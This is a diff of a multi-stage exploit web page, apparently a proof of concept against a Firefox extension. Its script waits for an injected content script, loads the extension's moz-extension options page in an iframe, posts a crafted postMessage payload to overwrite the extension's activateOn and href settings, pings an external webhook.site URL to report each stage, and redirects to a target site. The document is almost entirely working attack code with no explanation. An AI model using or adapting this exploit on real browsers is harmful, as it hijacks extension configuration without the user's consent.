@@ -1,36 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>Stage 1</title></head>
+<head><title>Stage 2</title></head>
 <body>
   <script>
     async function run() {
-      // 1. Register SW
-      await navigator.serviceWorker.register('/sw.js', { scope: '/' });
-      
-      // 2. Wait until SW fully controls network requests
-      if (!navigator.serviceWorker.controller) {
-        await new Promise(resolve => {
-          navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
-        });
-      }
+      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');
 
-      // Ping Webhook so you know Stage 1 finished
-      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_ready');
+      // 1. Give cs.js 3 full seconds to inject, run SW import, and send updateLastUrl message
+      await new Promise(r => setTimeout(r, 3000));
 
-      // 3. Open options iframe and hijack config
+      // 2. Open options iframe to reset activateOn
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
-        iframe.contentWindow.postMessage({
-          activateOn: window.location.origin,
-          href: 'https://doc.rust-lang.org/?bypass=1'
-        }, '*');
+        const payload = {
+          activateOn: 'https://doc.rust-lang.org/',
+          href: 'https://doc.rust-lang.org/',
+          url: 'https://doc.rust-lang.org/',
+          data: {
+            activateOn: 'https://doc.rust-lang.org/',
+            href: 'https://doc.rust-lang.org/'
+          }
+        };
 
+        iframe.contentWindow.postMessage(payload, '*');
+
+        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
+
+        // 3. Wait 3 seconds for async storage write to settle before redirecting
         setTimeout(() => {
-          window.location.href = '/stage2.html?ref=https://doc.rust-lang.org/';
-        }, 1000);
+          window.location.href = 'https://doc.rust-lang.org/stable/std/';
+        }, 3000);
       };
     }
     run();
